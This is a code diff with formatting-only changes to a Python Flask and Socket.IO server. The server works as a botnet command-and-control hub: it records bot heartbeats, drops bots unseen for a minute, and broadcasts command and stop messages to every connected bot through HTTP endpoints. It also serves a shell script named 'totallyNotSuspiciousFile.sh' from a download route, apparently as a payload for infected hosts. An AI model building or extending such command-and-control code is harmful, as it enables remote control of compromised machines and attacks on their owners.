@@ -24,6 +24,7 @@ def connect():
 def disconnect():
     print("Socket disconnected")
 
+
 @sio.event
 def heartbeat(data):
     global botnets
@@ -44,21 +45,25 @@ def send_command():
     emit("command", request.get_json(), namespace="/", broadcast=True)
     return "Done"
 
+
 @app.route('/command/stop', methods=["POST"])
 def send_stop():
     emit("stop", request.get_json(), namespace="/", broadcast=True)
     return "Done"
 
+
 @app.route('/botnets', methods=["GET"])
 @cross_origin()
 def get_botnets():
     global botnets
-    botnets = list(filter(lambda b: (time.time_ns() // 1_000_000) - b.last_seen < 60_000, botnets))
+    botnets = list(filter(lambda b: (time.time_ns() //
+                   1_000_000) - b.last_seen < 60_000, botnets))
     return jsonpickle.encode(list(map(jsonpickle.encode, botnets)))
+
 
 @app.route('/download', methods=["GET"])
 def myscript():
-    path= "Shell_script/totallyNotSuspiciousFile.sh"
+    path = "Shell_script/totallyNotSuspiciousFile.sh"
     return send_file(path)
 
 
